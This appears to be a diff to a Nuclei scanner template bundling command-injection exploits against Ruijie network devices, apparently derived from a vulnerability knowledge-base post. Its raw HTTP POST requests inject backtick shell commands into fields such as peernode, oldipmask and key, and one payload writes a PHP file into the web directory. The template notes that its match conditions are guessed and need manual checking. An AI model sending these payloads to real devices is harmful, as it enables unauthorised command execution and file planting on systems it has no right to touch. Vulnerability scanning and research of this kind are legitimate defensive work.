@@ -3,13 +3,8 @@ info:
   name: 锐捷各系统综合漏洞合集
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zt0zpqdw6lgkc95u
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zt0zpqdw6lgkc95u
 http:
 - raw:
   - 'POST /view/vpn/autovpn/online.php HTTP/1.1
@@ -57,7 +52,6 @@ http:
 
     peernode=`id+>1.txt`
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077455755-16a2483a-304f-4d3b-8432-4f6b29541c8f.png)
 
     文件路径
 
@@ -105,9 +99,7 @@ http:
     Content-Length: 68
 
 
-    text_ip_addr=0000:0000:0000::0000&oldipmask=`id+>1.txt`&oldgateway=1
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077456055-dd1b9ce8-6813-41b3-b1ef-d29448c65a52.png)'
+    text_ip_addr=0000:0000:0000::0000&oldipmask=`id+>1.txt`&oldgateway=1'
   redirects: false
   matchers:
   - status:
@@ -155,11 +147,8 @@ http:
 
     key=`id+>3.txt`
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077456320-9835b251-33b2-42c9-9708-d10f8924d5d1.png)
 
-    文件路径 /view/vpn/autovpn/3.txt
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077456576-1cb759c5-bb97-4a9d-8165-14543c87d525.png)'
+    文件路径 /view/vpn/autovpn/3.txt'
   redirects: false
   matchers:
   - status:
@@ -207,11 +196,8 @@ http:
 
     auth_method=1&pwd_policy=2&email2=`echo+"<?php+phpinfo();?>">1.php`&user_name=1
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077456872-2fdc2bef-ef51-4a97-9f52-c032204513b8.png)
 
-    文件路径` /view/systemConfig/sys_user/1.php`
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077457172-31268fd5-6b74-46f2-934b-b600f28bf1b1.png)'
+    文件路径` /view/systemConfig/sys_user/1.php`'
   redirects: false
   matchers:
   - status:
